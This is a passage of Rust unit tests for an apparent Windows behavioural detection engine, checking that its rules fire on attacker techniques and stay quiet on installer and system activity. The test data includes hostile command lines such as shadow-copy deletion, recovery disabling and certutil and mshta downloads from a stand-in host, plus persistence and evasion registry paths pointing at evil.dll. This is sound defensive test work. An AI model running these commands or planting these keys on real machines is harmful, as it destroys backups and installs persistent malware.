                timestamp_100ns: at + step,
                action,
                subject: av_ipc::DriverSubject::File,
                path: Some(std::path::PathBuf::from(path)),
                process_id,
                parent_process_id: 0,
                thread_id: 0,
                detail: 0,
                value: None,
command_line: None,
                driver_state: None,
            }
        };
        for (index, path) in [
            r"C:\Program Files\GIMP 2\share\gimp\2.0\themes\Default\images\gimp-logo.png",
            r"C:\Program Files\Joplin\resources\app.asar.unpacked\assets\notes.txt",
            r"C:\Users\example\AppData\Local\Programs\Obsidian\resources\licence.txt",
        ]
        .iter()
        .enumerate()
        {
            for step in 0..19u64 {
                for action in [
                    av_ipc::DriverEventAction::FileRenamed,
                    av_ipc::DriverEventAction::FileDeleted,
                ] {
                    let findings =
                        engine.observe_driver(&event(action, path.to_string(), step, 11_500 + index as u32));
                    assert!(
                        findings.is_empty(),
                        "a program's own file fired a document rule: {path} -> {findings:?}"
                    );
                }
            }
        }
        for (index, (path, action)) in [
            (r"C:\Users\example\Documents\report-{step}.docx", av_ipc::DriverEventAction::FileDeleted),
            (r"C:\Users\example\OneDrive - Contoso\Documents\notes-{step}.docx", av_ipc::DriverEventAction::FileRenamed),
            (r"C:\Users\example\Desktop\draft-{step}.pdf", av_ipc::DriverEventAction::FileRenamed),
            (r"C:\Users\example\Pictures\holiday-{step}.jpg", av_ipc::DriverEventAction::FileDeleted),
            (r"C:\Users\example\Downloads\photo-{step}.png", av_ipc::DriverEventAction::FileRenamed),
        ]
        .iter()
        .enumerate()
        {
            let mut fired = Vec::new();
            for step in 0..19u64 {
                fired.extend(engine.observe_driver(&event(
                    *action,
                    path.replace("{step}", &step.to_string()),
                    step,
                    12_000 + index as u32,
                )));
            }
            assert!(
                !fired.is_empty(),
                "a user's documents stopped firing: {path}"
            );
            assert!(
                fired.iter().all(|finding| finding.rule_id == "BEH-0005"
                    || finding.rule_id == "BEH-0006"),
                "a document sweep fired something else: {fired:?}"
            );
        }
    }

    #[test]
    fn the_documents_renamed_rule_ignores_a_steam_update() {
        // Measured on the host on 2026-10-19 at 15:56 and 15:58: a Steam update
        // renamed fifteen controller images inside its own install directory in
        // a minute. Game artwork there is not a user's document, and the same
        // fifteen in Pictures still fire.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 11_000 * TICKS_PER_SECOND;
        let event = |path: String, step: u64, process_id: u32| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::FileRenamed,
            subject: av_ipc::DriverSubject::File,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id: 0,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        for step in 0..15u64 {
            let findings = event(
                format!(
                    r"C:\Program Files (x86)\Steam\controller_base\images\api\dark\hp_m2_lg-{step}.png"
                ),
                step,
                11_001,
            );
            assert!(
                engine.observe_driver(&findings).is_empty(),
                "a Steam update fired the documents-renamed rule"
            );
        }
        let mut fired = false;
        for step in 15..30u64 {
            let findings = event(
                format!(r"C:\Users\example\Pictures\holiday-{step}.png"),
                step,
                11_002,
            );
            if !engine.observe_driver(&findings).is_empty() {
                fired = true;
            }
        }
        assert!(fired, "the documents-renamed rule stopped reporting elsewhere");
    }

    #[test]
    fn the_documents_deleted_rule_ignores_a_package_removal() {
        // Measured on the host on 2026-10-19 at 17:03 and 17:16: a winget
        // source update and a PowerToys uninstall removed package artwork
        // under `C:\Program Files\WindowsApps\Deleted\…`, and BEH-0006 warned.
        // That tree is where Windows retires an old package copy, so its
        // contents are never a user's documents. The same fifteen in Pictures
        // still fire.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 12_000 * TICKS_PER_SECOND;
        let event = |path: String, step: u64, process_id: u32| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::FileDeleted,
            subject: av_ipc::DriverSubject::File,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id: 0,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        for step in 0..20u64 {
            let findings = event(
                format!(
                    r"C:\Program Files\WindowsApps\Deleted\Microsoft.PowerToys.FileLocksmithContextMenu_0.102.2862.0_neutral__8wekyb3d8bbwead3c974b-3609-4bca-8bbb-4a2d3180b0f1\Assets\FileLocksmith\Square44x44Logo{step}.png"
                ),
                step,
                12_001,
            );
            assert!(
                engine.observe_driver(&findings).is_empty(),
                "a package removal fired the documents-deleted rule"
            );
        }
        let mut fired = false;
        for step in 20..40u64 {
            let findings = event(
                format!(r"C:\Users\example\Pictures\holiday-{step}.png"),
                step,
                12_002,
            );
            if !engine.observe_driver(&findings).is_empty() {
                fired = true;
            }
        }
        assert!(fired, "the documents-deleted rule stopped reporting elsewhere");
    }

    #[test]
    fn the_temp_folder_rule_ignores_the_installer_harnesses() {
        // Measured on the host on 2026-10-19, 17:06 to 17:15, while eight
        // packages were installed and removed: winget's download directory,
        // Inno Setup's `is-*.tmp`, NSIS's `~nsu*.tmp` and Squirrel's
        // `SquirrelTemp` each started a program from a temporary folder. A
        // program started anywhere else in %TEMP% is still reported.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 13_000 * TICKS_PER_SECOND;
        let event = |path: &str, step: u64, process_id: u32| av_ipc::DriverEvent {
            sequence: step,
            timestamp_100ns: at + step,
            action: av_ipc::DriverEventAction::ProcessStarted,
            subject: av_ipc::DriverSubject::Process,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id: 4,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        };
        for (index, path) in [
            r"C:\Users\example\AppData\Local\Temp\WinGet\Obsidian.Obsidian.1.14.4\Obsidian-1.14.4.exe",
            r"C:\Users\example\AppData\Local\Temp\is-L247901IJ4.tmp\innosetup-6.7.3.tmp",
            r"C:\Users\example\AppData\Local\Temp\~nsuA.tmp\Un_A.exe",
            r"C:\Users\example\AppData\Local\SquirrelTemp\Update.exe",
            r"C:\Users\example\AppData\Local\Temp\7zS1A2B\7z-out\innosetup.tmp",
            r"C:\Users\example\AppData\Local\Temp\_iu14D2N.tmp\Un_A.exe",
        ]
        .iter()
        .enumerate()
        {
            assert!(
                engine
                    .observe_driver(&event(path, index as u64, 13_000 + index as u32))
                    .is_empty(),
                "an installer harness fired the temp-folder rule: {path}"
            );
        }
        let fired = engine.observe_driver(&event(
            r"C:\Users\example\AppData\Local\Temp\dropper\invoice.exe",
            9,
            13_009,
        ));
        assert_eq!(fired.len(), 1, "the temp-folder rule stopped reporting: {fired:?}");
        assert_eq!(fired[0].rule_id, "BEH-0033");
    }

    #[test]
    fn the_mass_key_delete_rule_ignores_the_windows_bookkeeping_measured_on_the_host() {
        // Host measurement of 2026-10-19: Windows Error Reporting's
        // `TermReason` keys, a disconnected interface's `NetworkSetup2`
        // properties, an installer's `Installer\UserData\…\Components`
        // entries, and the app state repository rewritten by package
        // installation and removal at 17:03 and 17:16. All four are scratch
        // space their owner rewrites.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 6_000 * TICKS_PER_SECOND;
        for (index, path) in [
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting\TermReason\18080",
            r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\NetworkSetup2\Interfaces\{8D69708D-DDEC-A599-BB02-0475A5D2150E}\Properties",
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Components\31721342F1DF68F459E26E4226DFE627",
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModel\StateRepository\Cache\ApplicationUser\Index\User\7\317f",
        ]
        .iter()
        .enumerate()
        {
            let process_id = 7_000 + index as u32;
            for step in 0..40u64 {
                let findings = engine.observe(&registry_record(path, at + step, process_id));
                assert!(
                    findings.is_empty(),
                    "a bookkeeping tree fired the mass-key-delete rule: {path} -> {findings:?}"
                );
            }
        }
    }

    #[test]
    fn the_ifeo_rule_ignores_the_mitigation_setting() {
        // Measured on the host on 2026-10-19 at 14:41:32: Defender's own
        // maintenance wrote `MitigationOptions` under Image File Execution
        // Options for its scan agent, and BEH-0013 warned. The value is the
        // exploit-protection setting, not a debugger; `Debugger` is still
        // reported.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 7_000 * TICKS_PER_SECOND;
        let event = |path: &str| Record {
            timestamp: at,
            subject: Subject::Registry,
            action: Action::RegistryChanged,
            detail: Detail::RegistryValueSet.code(),
            path: Some(path.to_string()),
            folded_path: Some(path.to_ascii_lowercase()),
            value: None,
            folded_value: None,
            command_line: None,
            process_id: 8_001,
            parent_process_id: 4,
        };
        for path in [
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DefenderAgentScan.exe\MitigationOptions",
            // Notepad3 installs itself as notepad's replacement by writing
            // `UseFilter`, measured on this host before 2026-10-19 and
            // repeated in the round of that day. It is a filter setting, not a
            // debugger.
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\UseFilter",
        ] {
            assert!(
                engine.observe(&event(path)).is_empty(),
                "a non-debugger IFEO value fired the rule: {path}"
            );
        }
        let fired = engine.observe(&event(
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger",
        ));
        assert_eq!(fired.len(), 1, "the IFEO rule stopped reporting a debugger: {fired:?}");
        assert_eq!(fired[0].rule_id, "BEH-0013");
    }

    #[test]
    fn the_mass_key_delete_rule_ignores_the_application_hive() {
        // Measured in the test VM on 2026-10-18: one `svchost.exe` (pid 968)
        // deleted thirty keys under `\REGISTRY\A\{…}\WorkItems\{…}` in half a
        // minute, and the rule warned about a healthy machine. The hive is
        // excluded, and this test keeps both halves true: it stays quiet there,
        // and it still fires somewhere else.
        let mut engine = builtin().expect("the shipped rules parse");
        let at = 1_000 * TICKS_PER_SECOND;
        for step in 0..30 {
            let findings = engine.observe(&registry_record(
                r"\REGISTRY\A\{6577a0ab-0e60-4ac9-af65-4a25c0ae1b5f}\WorkItems\{4c9276ce-0ea2-4f66-aacc-8cf1dd988ea6}",
                at + step,
                968,
            ));
            assert!(
                findings.is_empty(),
                "the application hive fired: {findings:?}"
            );
        }
        let mut fired = Vec::new();
        for step in 0..30 {
            fired.extend(engine.observe(&registry_record(
                r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Product\Key",
                at + 1_000 + step,
                968,
            )));
        }
        assert_eq!(
            fired.len(),
            1,
            "the rule stopped working outside the application hive"
        );
        assert_eq!(fired[0].rule_id, "BEH-0027");
    }

    #[test]
    fn the_evasion_rules_fire_on_the_key_a_technique_actually_writes() {
        // BEH-0040..BEH-0052 watch the keys that move the protection rather
        // than the program. Each path is the key the technique writes, spelled
        // the way the driver spells it: the value's name is part of the path,
        // which is what lets `path_contains` name a value.
        let cases: &[(&str, &str, Option<&str>)] = &[
            (
                "BEH-0040",
                r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\me\AppData",
                Some(r"C:\Users\me\AppData"),
            ),
            (
                "BEH-0041",
                r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\AMSI\Providers\{11111111-2222-3333-4444-555555555555}",
                Some(r"C:\ProgramData\Vendor\amsi.dll"),
            ),
            (
                "BEH-0042",
                r"\REGISTRY\CLASSES\HKCU\CLSID\{11111111-2222-3333-4444-555555555555}\InprocServer32",
                Some(r#""C:\Users\me\AppData\Roaming\evil.dll""#),
            ),
            (
                "BEH-0043",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCertDlls\inject",
                Some(r"C:\Users\me\AppData\Roaming\inject.dll"),
            ),
            (
                "BEH-0044",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Session Manager\BootExecute",
                Some("native.exe"),
            ),
            (
                "BEH-0045",
                r"\REGISTRY\USER\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\Vendor",
                Some(r"C:\Users\me\AppData\Roaming\v.exe"),
            ),
            (
                "BEH-0046",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\VendorSvc\Parameters\ServiceDll",
                Some(r"C:\Users\me\AppData\Roaming\evil.dll"),
            ),
            (
                "BEH-0051",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\Notification Packages",
                Some("evil"),
            ),
            (
                "BEH-0052",
                r"\REGISTRY\USER\S-1-5-21-1\Environment\UserInitMprLogonScript",
                Some(r"C:\Users\me\AppData\Roaming\logon.exe"),
            ),
        ];
        for (rule, path, value) in cases {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&registry_value_record(path, *value, 10));
            assert!(
                fired.iter().any(|finding| finding.rule_id == *rule),
                "{rule} did not fire on {path} = {value:?}: {fired:?}"
            );
        }
    }

    #[test]
    fn the_evasion_rules_stay_quiet_on_the_writer_that_owns_the_key() {
        // The other half, and the reason these rules need no whitelist: what
        // separates the two cases is the *value* the technique points at, not
        // the process that wrote it.
        let quiet: &[(&str, &str, Option<&str>)] = &[
            // A COM server installed properly.
            (
                "BEH-0042",
                r"\REGISTRY\CLASSES\HKLM\CLSID\{11111111-2222-3333-4444-555555555555}\InprocServer32",
                Some(r"C:\Program Files\Vendor\component.dll"),
            ),
            // A per-user installer's own class: the excluded tree.
            (
                "BEH-0042",
                r"\REGISTRY\CLASSES\HKCU\CLSID\{11111111-2222-3333-4444-555555555555}\InprocServer32",
                Some(r"C:\Users\me\AppData\Local\Programs\Vendor\component.dll"),
            ),
            // `chkdsk` scheduling a check is the one ordinary writer of
            // `BootExecute`.
            (
                "BEH-0044",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Session Manager\BootExecute",
                Some("autocheck autochk *"),
            ),
            // An installer's own Run entry, in the ordinary tree.
            (
                "BEH-0045",
                r"\REGISTRY\USER\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\Vendor",
                Some(r#""C:\Program Files\Vendor\v.exe""#),
            ),
            // A service whose DLL is where a service's DLL belongs.
            (
                "BEH-0046",
                r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\VendorSvc\Parameters\ServiceDll",
                Some(r"C:\Windows\System32\vendor.dll"),
            ),
        ];
        for (rule, path, value) in quiet {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&registry_value_record(path, *value, 10));
            assert!(
                !fired.iter().any(|finding| finding.rule_id == *rule),
                "{rule} fired on the legitimate writer {path} = {value:?}: {fired:?}"
            );
        }
    }

    #[test]
    fn the_lineage_rules_fire_on_the_pair_and_not_on_either_half() {
        // BEH-0047 is a path shape; BEH-0048 and BEH-0049 are pairs, and the
        // engine names a parent from its own record of that parent's start --
        // never from the child's event. So each case starts the parent first,
        // and the assertions on the halves that must stay quiet are what say
        // the rule is not simply matching every process.
        let at = 20_000 * TICKS_PER_SECOND;
        let event = |path: &str, process_id: u32, parent_process_id: u32, step: u64| {
            av_ipc::DriverEvent {
                sequence: step,
                timestamp_100ns: at + step,
                action: av_ipc::DriverEventAction::ProcessStarted,
                subject: av_ipc::DriverSubject::Process,
                path: Some(std::path::PathBuf::from(path)),
                process_id,
                parent_process_id,
                thread_id: 0,
                detail: 0,
                value: None,
command_line: None,
                driver_state: None,
            }
        };

        // A program started from a share.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe_driver(&event(r"\\fileserver\public\tool.exe", 900, 4, 1));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0047"),
            "a program from a share was not reported: {fired:?}"
        );

        // A service host that starts an interpreter: the parent is started
        // first so the engine knows its image.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&event(r"C:\Windows\System32\svchost.exe", 600, 4, 1));
        let fired = engine.observe_driver(&event(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            601,
            600,
            2,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0048"),
            "a service host starting powershell was not reported: {fired:?}"
        );

        // The same child from a user program is not that rule.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&event(r"C:\Windows\explorer.exe", 700, 4, 1));
        let fired = engine.observe_driver(&event(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            701,
            700,
            2,
        ));
        assert!(
            !fired.iter().any(|f| f.rule_id == "BEH-0048"),
            "explorer starting powershell was reported as a service host: {fired:?}"
        );

        // A reader that starts a DLL host.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&event(r"C:\Program Files\Microsoft Office\WINWORD.EXE", 800, 4, 1));
        let fired = engine.observe_driver(&event(r"C:\Windows\System32\rundll32.exe", 801, 800, 2));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0049"),
            "winword starting rundll32 was not reported: {fired:?}"
        );
    }

    #[test]
    fn the_ransomware_chain_rules_fire_on_their_own_shape() {
        let at = 30_000 * TICKS_PER_SECOND;

        // The note written rather than renamed.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&file_record(
            r"C:\Users\me\Documents\!!!README.txt",
            Action::FileWritten,
            8_101,
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0053"),
            "a written ransom note was not reported: {fired:?}"
        );

        // Encryption in place: no rename, no delete, only writes.
        let mut engine = builtin().expect("the shipped rules parse");
        let mut fired = Vec::new();
        for index in 0..40u64 {
            let path = format!(r"C:\Users\me\Documents\work\file{index}.docx");
            fired = engine.observe(&file_record(&path, Action::FileWritten, 8_101, at + index));
        }
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0054"),
            "forty writes in a document folder were not reported: {fired:?}"
        );

        // The rung before the encryption: a recovery-removal tool.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe_driver(&process_event(
            r"C:\Windows\System32\vssadmin.exe",
            900,
            4,
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0055"),
            "vssadmin was not reported: {fired:?}"
        );

        // The boot chain is a file, so this stream sees it.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&file_record(
            r"C:\EFI\Microsoft\Boot\bootmgfw.efi",
            Action::FileWritten,
            8_101,
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0056"),
            "a written boot loader was not reported: {fired:?}"
        );

        // Servicing rewrites the same file on every feature update, and the
        // exclusion is what keeps that quiet. The engine names the image from
        // the start it saw, so the parent has to be started first.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&process_event(
            r"C:\Windows\WinSxS\TiWorker.exe",
            950,
            4,
            at,
        ));
        let fired = engine.observe(&file_record(
            r"C:\EFI\Microsoft\Boot\bootmgfw.efi",
            Action::FileWritten,
            950,
            at + 1,
        ));
        assert!(
            !fired.iter().any(|f| f.rule_id == "BEH-0056"),
            "Windows servicing rewriting the boot loader was reported: {fired:?}"
        );
    }

    #[test]
    fn the_pair_rules_fire_on_the_pair_and_stay_quiet_on_either_half() {
        let at = 40_000 * TICKS_PER_SECOND;

        // A browser starting a downloaded program.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&process_event(
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            500,
            4,
            at,
        ));
        let fired = engine.observe_driver(&process_event(
            r"C:\Users\me\Downloads\update.exe",
            501,
            500,
            at + 1,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0057"),
            "a browser starting a downloaded program was not reported: {fired:?}"
        );

        // The same program started from Explorer is not that rule: the pair is
        // the condition, not the folder.
        let mut engine = builtin().expect("the shipped rules parse");
        engine.observe_driver(&process_event(r"C:\Windows\explorer.exe", 510, 4, at));
        let fired = engine.observe_driver(&process_event(
            r"C:\Users\me\Downloads\update.exe",
            511,
            510,
            at + 1,
        ));
        assert!(
            !fired.iter().any(|f| f.rule_id == "BEH-0057"),
            "explorer starting a download was reported as a browser: {fired:?}"
        );

        // The Recycle Bin.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe_driver(&process_event(
            r"C:\$Recycle.Bin\S-1-5-21-1\$R1A2B3C.exe",
            520,
            4,
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0058"),
            "a program out of the Recycle Bin was not reported: {fired:?}"
        );

        // A COM local server in a profile folder, and the same key pointing at
        // a properly installed one.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            r"\REGISTRY\CLASSES\HKCU\CLSID\{11111111-2222-3333-4444-555555555555}\LocalServer32",
            Some(r#""C:\Users\me\AppData\Roaming\evil.exe""#),
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0060"),
            "a COM local server in AppData was not reported: {fired:?}"
        );

        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            r"\REGISTRY\CLASSES\HKLM\CLSID\{11111111-2222-3333-4444-555555555555}\LocalServer32",
            Some(r#""C:\Program Files\Vendor\server.exe""#),
            at,
        ));
        assert!(
            !fired.iter().any(|f| f.rule_id == "BEH-0060"),
            "an installed COM local server was reported: {fired:?}"
        );
    }

    #[test]
    fn the_startup_and_spooler_rules_fire_on_their_own_key() {
        let at = 50_000 * TICKS_PER_SECOND;

        // A shortcut dropped into a Startup folder is a write, not a rename.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&file_record(
            r"C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk",
            Action::FileWritten,
            8_101,
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0061"),
            "a shortcut written into Startup was not reported: {fired:?}"
        );

        // The spooler loads these into every process that prints.
        for path in [
            r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Print\Monitors\evil\Driver",
            r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\evil\Driver",
        ] {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&registry_value_record(
                path,
                Some(r"C:\Users\me\AppData\Roaming\evil.dll"),
                at,
            ));
            assert!(
                fired.iter().any(|f| f.rule_id == "BEH-0062"),
                "a print driver value at {path} was not reported: {fired:?}"
            );
        }

        // The icon service DLL.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\IconServiceLib",
            Some(r"C:\Users\me\AppData\Roaming\evil.dll"),
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0063"),
            "IconServiceLib was not reported: {fired:?}"
        );

        // A program staged in the shared profile.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe_driver(&process_event(r"C:\Users\Public\payload.exe", 520, 4, at));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0064"),
            "a program out of the Public profile was not reported: {fired:?}"
        );

        // A shadow-copy exclusion.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\BackupRestore\FilesNotToSnapshot\Vendor",
            Some(r"*.* /s"),
            at,
        ));
        assert!(
            fired.iter().any(|f| f.rule_id == "BEH-0065"),
            "a shadow copy exclusion was not reported: {fired:?}"
        );
    }

    #[test]
    fn the_command_line_rules_need_the_arguments_not_only_the_program() {
        // The whole point of carrying a command line: `vssadmin.exe` alone is
        // an administrator, and `vssadmin delete shadows` is the rung before
        // the encryption. Every negative below is a real spelling of the same
        // program that must stay quiet.
        let at = 60_000 * TICKS_PER_SECOND;
        let start = |path: &str, command_line: Option<&str>| {
            let mut record = Record {
                timestamp: at,
                subject: Subject::Process,
                action: Action::ProcessStarted,
                detail: 0,
                path: Some(path.to_string()),
                folded_path: Some(path.to_ascii_lowercase()),
                value: None,
                folded_value: None,
                command_line: None,
                process_id: 8_601,
                parent_process_id: 4,
            };
            if let Some(line) = command_line {
                record.set_command_line(line);
            }
            record
        };
        let fires = |path: &str, line: &str, rule: &str| {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&start(path, Some(line)));
            fired.iter().any(|finding| finding.rule_id == rule)
        };

        assert!(fires(
            r"C:\Windows\System32\vssadmin.exe",
            r"vssadmin delete shadows /all /quiet",
            "BEH-0066"
        ));
        assert!(
            !fires(
                r"C:\Windows\System32\vssadmin.exe",
                r"vssadmin list shadows",
                "BEH-0066"
            ),
            "listing shadow copies was reported as deleting them"
        );
        assert!(fires(
            r"C:\Windows\System32\bcdedit.exe",
            r"bcdedit /set {default} recoveryenabled No",
            "BEH-0067"
        ));
        assert!(fires(
            r"C:\Windows\System32\certutil.exe",
            r"certutil -urlcache -f http://example.invalid/x.exe x.exe",
            "BEH-0068"
        ));
        assert!(
            !fires(
                r"C:\Windows\System32\certutil.exe",
                r"certutil -urlcache * delete",
                "BEH-0068"
            ),
            "clearing the URL cache was reported as a download"
        );
        assert!(fires(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"powershell -enc SQBFAFgA",
            "BEH-0069"
        ));
        assert!(
            !fires(
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                r"powershell -File script.ps1",
                "BEH-0069"
            ),
            "an ordinary script run was reported as an encoded command"
        );
        assert!(fires(
            r"C:\Windows\System32\mshta.exe",
            r"mshta http://example.invalid/x.hta",
            "BEH-0070"
        ));

        // A start whose command line could not be read satisfies nothing: the
        // absence of the fact is not the fact.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&start(r"C:\Windows\System32\vssadmin.exe", None));
        assert!(
            !fired.iter().any(|finding| finding.rule_id == "BEH-0066"),
            "a start with no command line satisfied a command-line rule: {fired:?}"
        );
    }

    fn process_event(path: &str, process_id: u32, parent_process_id: u32, at: u64) -> av_ipc::DriverEvent {
        av_ipc::DriverEvent {
            sequence: at,
            timestamp_100ns: at,
            action: av_ipc::DriverEventAction::ProcessStarted,
            subject: av_ipc::DriverSubject::Process,
            path: Some(std::path::PathBuf::from(path)),
            process_id,
            parent_process_id,
            thread_id: 0,
            detail: 0,
            value: None,
command_line: None,
            driver_state: None,
        }
    }

    /// A file event, in the shape `Record::from_driver` makes for one.
    fn file_record(path: &str, action: Action, process_id: u32, at: u64) -> Record {
        Record {
            timestamp: at,
            subject: Subject::File,
            action,
            detail: 0,
            path: Some(path.to_string()),
            folded_path: Some(path.to_ascii_lowercase()),
            value: None,
            folded_value: None,
            command_line: None,
            process_id,
            parent_process_id: 4,
        }
    }

    /// A registry value write, in the shape `Record::from_driver` makes when
    /// the driver sent the value's data.
    fn registry_value_record(path: &str, value: Option<&str>, at: u64) -> Record {
        Record {
            timestamp: at,
            subject: Subject::Registry,
            action: Action::RegistryChanged,
            detail: Detail::RegistryValueSet.code(),
            path: Some(path.to_string()),
            folded_path: Some(path.to_ascii_lowercase()),
            value: value.map(str::to_string),
            folded_value: value.map(str::to_ascii_lowercase),
            command_line: None,
            process_id: 8_101,
            parent_process_id: 4,
        }
    }

    #[test]
    fn a_value_condition_cannot_be_satisfied_by_an_event_without_one() {
        // The rule that keeps this mechanism honest: a value predicate is a
        // statement about data, and an event that carried no data cannot
        // satisfy it. The alternative — treating a missing value as an empty
        // one — would make every `value_contains` rule fire on every registry
        // key change, which is the false-positive shape the field was added to
        // remove.
        let mut engine = Engine::from_toml(
            r#"
            [[rule]]
            id = "BEH-9005"
            name = "test rule"
            description = "A test rule."
            severity = "medium"
            subject = "registry"
            action = ["registry_changed"]
            detail = ["registry_value_set"]
            value_contains = ["\\temp\\"]
            "#,
        )
        .expect("the test's rule parses");
        let key = r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Value";

        assert!(
            engine.observe(&registry_value_record(key, None, 10)).is_empty(),
            "a missing value satisfied a value condition"
        );
        assert!(
            engine
                .observe(&registry_value_record(
                    key,
                    Some(r"C:\Program Files\Vendor\v.exe"),
                    20
                ))
                .is_empty(),
            "a value that does not contain the substring matched"
        );
        let fired = engine.observe(&registry_value_record(
            key,
            Some(r"C:\Users\me\AppData\Local\Temp\dropper.exe"),
            30,
        ));
        assert_eq!(fired.len(), 1, "the value condition did not fire: {fired:?}");
        assert_eq!(
            fired[0].value.as_deref(),
            Some(r"C:\Users\me\AppData\Local\Temp\dropper.exe"),
            "the finding does not carry the evidence it fired on"
        );
    }

    #[test]
    fn a_value_exclusion_refuses_a_value_the_positive_condition_matched() {
        // The same two-stage shape as `path_excludes`, against the data: the
        // positive condition says what to look at, the exclusion says which of
        // those are ordinary.
        let mut engine = Engine::from_toml(
            r#"
            [[rule]]
            id = "BEH-9006"
            name = "test rule"
            description = "A test rule."
            severity = "medium"
            subject = "registry"
            action = ["registry_changed"]
            detail = ["registry_value_set"]
            value_contains = ["\\temp\\"]
            value_excludes = ["\\temp\\vendor\\*"]
            "#,
        )
        .expect("the test's rule parses");
        let key = r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Value";
        assert!(
            engine
                .observe(&registry_value_record(
                    key,
                    Some(r"C:\Temp\Vendor\updater.exe"),
                    10
                ))
                .is_empty(),
            "the exclusion did not refuse the value it names"
        );
        assert_eq!(
            engine
                .observe(&registry_value_record(
                    key,
                    Some(r"C:\Temp\Other\updater.exe"),
                    20
                ))
                .len(),
            1,
            "the exclusion refused a value it does not name"
        );
    }

    #[test]
    fn the_persistence_rules_read_the_value_and_not_only_the_key() {
